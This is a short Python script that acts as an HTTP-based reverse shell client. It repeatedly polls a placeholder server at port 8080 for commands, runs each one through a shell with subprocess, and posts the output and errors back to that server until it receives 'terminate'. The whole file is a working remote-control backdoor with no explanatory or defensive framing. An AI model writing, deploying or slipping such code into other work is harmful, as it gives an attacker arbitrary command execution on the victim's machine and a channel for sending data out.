import requests
import subprocess
import time

while True:

    req = requests.get('http://[SERVER IP]:8080') # Send GET request
    command = req.text # Store the received txt into command variable

    if 'terminate' in command:
        break

    else:
        CMD = subprocess.Popen(command, shell=True,stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        post_response = requests.post(url='http://[SERVER IP]:8080', data=CMD.stdout.read()) 
        post_response = requests.post(url='http://[SERVER IP]:8080', data=CMD.stderr.read()) 

    time.sleep(3)
